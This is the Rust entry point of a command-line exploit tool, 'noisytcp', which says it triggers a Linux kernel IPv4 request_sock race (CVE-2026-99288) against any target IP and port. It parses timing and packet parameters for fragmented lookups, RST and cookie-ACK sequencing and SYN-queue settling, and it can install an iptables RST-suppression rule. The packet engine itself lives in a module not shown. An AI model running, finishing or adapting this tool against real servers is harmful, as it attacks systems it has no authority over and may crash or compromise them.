mod noisy_tcp;

use clap::{Parser, ValueEnum};
use std::net::Ipv4Addr;

#[derive(Clone, Copy, Debug, ValueEnum)]
enum Mode {
    Probe,
    Verify,
    Race,
}

#[derive(Parser)]
#[command(
    name = "noisytcp",
    version,
    about = "Trigger the NoisyTCP CVE-2026-99288 IPv4 request_sock ABA race"
)]
struct Args {
    #[arg(help = "Target Linux server IPv4 address")]
    ip: Ipv4Addr,

    #[arg(default_value_t = 9000, help = "Target listening TCP port")]
    port: u16,

    #[arg(long, value_enum, default_value_t = Mode::Race, help = "Operation mode; race runs probe and verify first")]
    mode: Mode,

    #[arg(long, help = "Effective listener backlog; calibrate when omitted")]
    backlog: Option<usize>,

    #[arg(
        long,
        default_value_t = 0,
        help = "Race tuples per round; 0 selects it from the backlog"
    )]
    batch: usize,

    #[arg(long, default_value_t = 1, help = "Fragmented lookup packets per shot")]
    readers: usize,

    #[arg(
        long,
        default_value_t = 0,
        help = "Race duration in seconds; 0 runs until Ctrl+C"
    )]
    duration: u64,

    #[arg(long, default_value_t = 40000, help = "First source port")]
    source_port: u16,

    #[arg(
        long,
        default_value_t = 16384,
        help = "Number of source ports available to the engine"
    )]
    source_port_count: usize,

    #[arg(
        long,
        default_value_t = 20,
        help = "Delay between lookup fragments, microseconds"
    )]
    frag_gap_us: u64,

    #[arg(
        long,
        default_value_t = 0,
        help = "Delay between lookup completion and RST, microseconds"
    )]
    free_gap_us: u64,

    #[arg(
        long,
        default_value_t = 4,
        help = "Delay between RST and cookie ACK, microseconds"
    )]
    alloc_gap_us: u64,

    #[arg(
        long,
        default_value_t = 4,
        help = "Random delay added to each gap, microseconds"
    )]
    jitter_us: u64,

    #[arg(
        long,
        default_value_t = 5000,
        help = "SYN queue settling delay, microseconds"
    )]
    settle_us: u64,

    #[arg(
        long,
        help = "SYN-ACK timeout in milliseconds; measured automatically by default"
    )]
    synack_ms: Option<u64>,

    #[arg(long, default_value_t = 1, help = "SO_MARK value for crafted packets")]
    mark: u32,

    #[arg(
        long,
        help = "Do not install the temporary iptables RST-suppression rule"
    )]
    no_rst_filter: bool,

    #[arg(long, help = "Continue even when host-generated RSTs are detected")]
    assume_ok: bool,

    #[arg(long, help = "Print calibration and packet diagnostics")]
    debug: bool,
}

struct Config {
    target: Ipv4Addr,
    port: u16,
    mode: Mode,
    backlog: Option<usize>,
    batch: usize,
    readers: usize,
    duration: u64,
    source_port: u16,
    source_port_count: usize,
    frag_gap_us: u64,
    free_gap_us: u64,
    alloc_gap_us: u64,
    jitter_us: u64,
    settle_us: u64,
    synack_ms: Option<u64>,
    mark: u32,
    no_rst_filter: bool,
    assume_ok: bool,
    debug: bool,
}

fn validate(args: &Args) -> Result<(), String> {
    if args.source_port == 0 {
        return Err("--source-port must be greater than zero".into());
    }
    if args.source_port_count < 1024 {
        return Err("--source-port-count must be at least 1024".into());
    }
    if usize::from(args.source_port) + args.source_port_count > 65_536 {
        return Err("--source-port plus --source-port-count exceeds the TCP port range".into());
    }
    if args.batch > 512 {
        return Err("--batch cannot exceed 512".into());
    }
    if args.readers == 0 || args.readers > 16 {
        return Err("--readers must be between 1 and 16".into());
    }
    if args.backlog == Some(0) {
        return Err("--backlog must be greater than zero".into());
    }
    if args.backlog.is_some_and(|value| value > 4096) {
        return Err("--backlog cannot exceed 4096".into());
    }
    if let Some(backlog) = args.backlog {
        let batch = if args.batch == 0 {
            backlog.min(512)
        } else {
            args.batch
        };
        if backlog + batch > args.source_port_count {
            return Err(
                "--source-port-count must be at least --backlog plus the effective --batch".into(),
            );
        }
    }
    if args.synack_ms == Some(0) {
        return Err("--synack-ms must be greater than zero".into());
    }
    if args.frag_gap_us > 1_000_000
        || args.free_gap_us > 1_000_000
        || args.alloc_gap_us > 1_000_000
        || args.jitter_us > 1_000_000
        || args.settle_us > 1_000_000
    {
        return Err("microsecond delays cannot exceed 1000000".into());
    }
    Ok(())
}

fn main() {
    let args = Args::parse();
    if let Err(error) = validate(&args) {
        eprintln!("{error}");
        std::process::exit(2);
    }
    let config = Config {
        target: args.ip,
        port: args.port,
        mode: args.mode,
        backlog: args.backlog,
        batch: args.batch,
        readers: args.readers,
        duration: args.duration,
        source_port: args.source_port,
        source_port_count: args.source_port_count,
        frag_gap_us: args.frag_gap_us,
        free_gap_us: args.free_gap_us,
        alloc_gap_us: args.alloc_gap_us,
        jitter_us: args.jitter_us,
        settle_us: args.settle_us,
        synack_ms: args.synack_ms,
        mark: args.mark,
        no_rst_filter: args.no_rst_filter,
        assume_ok: args.assume_ok,
        debug: args.debug,
    };
    if let Err(error) = noisy_tcp::run(config) {
        eprintln!("NoisyTCP failed: {error}");
        std::process::exit(1);
    }
}
